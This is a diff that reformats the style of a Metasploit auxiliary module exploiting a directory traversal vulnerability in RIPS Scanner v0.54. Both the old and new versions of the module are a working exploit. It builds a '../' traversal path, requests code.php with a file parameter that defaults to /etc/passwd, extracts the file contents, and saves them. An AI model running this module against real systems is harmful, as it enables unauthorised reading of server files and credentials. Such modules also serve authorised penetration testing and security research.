@@ -9,42 +9,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'RIPS Scanner Directory Traversal',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54,
-        allowing to read arbitrary files with the web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'RIPS Scanner Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54,
+          allowing to read arbitrary files with the web server privileges.
+        },
+        'References' => [
           ['EDB', '18660'],
           ['URL', 'http://codesec.blogspot.com/2015/03/rips-scanner-v-054-local-file-include.html']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'localh0t', # Vulnerability discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI', [ true,  "The URI path to the web application", "/rips/"]),
-        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
+        OptString.new('TARGETURI', [ true, 'The URI path to the web application', '/rips/']),
+        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
-    traversal = "../" * datastore['DEPTH']
+    traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
-    filename = filename[1, filename.length] if filename =~ /^\//
+    filename = filename[1, filename.length] if filename =~ %r{^/}
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri.path, 'windows', 'code.php'),
+      'uri' => normalize_uri(target_uri.path, 'windows', 'code.php'),
       'vars_get' =>
         {
           'file' => "#{traversal}#{filename}"
@@ -52,13 +54,13 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if res &&
-        res.code == 200 &&
-        res.headers.include?('Set-Cookie') &&
-        res.body.length > 304
+       res.code == 200 &&
+       res.headers.include?('Set-Cookie') &&
+       res.body.length > 304
 
       html = Nokogiri::HTML(res.body)
       html_clean = html.search('.codeline').text
-      print_line("#{html_clean}")
+      print_line(html_clean.to_s)
 
       fname = datastore['FILEPATH']
 
@@ -72,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good("File saved in: #{path}")
     else
-      print_error("Nothing was downloaded")
+      print_error('Nothing was downloaded')
     end
   end
 end
